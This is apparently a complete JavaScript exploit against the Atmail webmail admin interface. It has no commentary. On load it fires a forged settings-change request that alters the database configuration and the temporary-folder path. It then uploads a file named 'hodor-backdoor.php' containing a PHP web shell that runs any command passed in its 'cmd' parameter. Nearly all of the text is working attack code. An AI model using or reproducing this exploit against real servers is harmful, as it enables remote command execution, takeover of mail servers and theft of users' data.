var filename = "hodor-backdoor.php";

function globalsave()
{
    var uri = "/index.php/admin/settings/globalsave";
    var query_string = "?save=1&fields%5Bsql_host%5D=127.0.0.1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&fields[tmpFolderBaseName]=";
    xhr = new XMLHttpRequest();
    xhr.open("GET", uri + query_string, true);
    xhr.send(null);
}

function addattachment()
{
    var uri = "/index.php/mail/composemessage/addattachment/composeID/";
    xhr = new XMLHttpRequest();
    xhr.open("POST", uri, true);
    xhr.setRequestHeader("Content-Type","multipart/form-data; boundary=----WebKitFormBoundarye9MjEAWpKTX4IkNl");
    xhr.send('------WebKitFormBoundarye9MjEAWpKTX4IkNl\n' +
         'Content-Disposition: form-data; name="newAttachment"; filename="' + filename + '"\n' +
         'Content-Type:\n\n' +
         '<?php\n' +
         'if(isset($_REQUEST["cmd"])){\n' +
         'echo "<pre>";\n' +
         '$cmd = ($_REQUEST["cmd"]);\n' +
         'system($cmd);\n' +
         'echo "</pre>";\n' +
         'die;\n' +
         '}\n' +
         '?>\n\n' +
         '------WebKitFormBoundarye9MjEAWpKTX4IkNl--\n');
}

globalsave();
addattachment();

